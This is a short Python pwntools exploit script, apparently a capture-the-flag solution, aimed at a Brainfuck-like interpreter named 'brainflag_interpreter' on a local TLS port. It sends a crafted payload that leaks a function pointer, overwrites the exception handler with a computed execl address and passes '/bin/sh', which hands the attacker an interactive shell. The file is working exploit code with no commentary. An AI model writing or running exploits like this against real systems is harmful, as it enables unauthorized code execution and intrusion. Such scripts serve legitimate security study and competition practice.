#!/usr/bin/env python

from pwn import *

memory = 0x00000000000bfac0
exception_handler = 0x00000000000be0b0
default_exception_handler = 0x0000000000009040
execl = 0x0000000000020b80

assert exception_handler < memory

delta1 = memory - exception_handler
delta2 = execl - default_exception_handler

payload = (delta1 * '<') + '.>.>.>.>.>.>.>.,<,<,<,<,<,<,<,' + (delta1 * '>') + '>+[>,]<[<]>>@'

if False: # local
	conn = process(['./brainflag_interpreter', payload])
else:
	conn = remote('127.0.0.1', 50000, ssl=True)
	conn.recvuntil(b'execute: ')
	conn.sendline(payload.encode('utf-8'))

def recvfixed(n):
	bytes = b''
	while len(bytes) < n:
		bytes += conn.recv(n - len(bytes))
	return bytes

eh_addr = int.from_bytes(recvfixed(8), 'little')
conn.send((eh_addr + delta2).to_bytes(8, 'big'))
conn.send(b'/bin/sh\0')
conn.interactive()


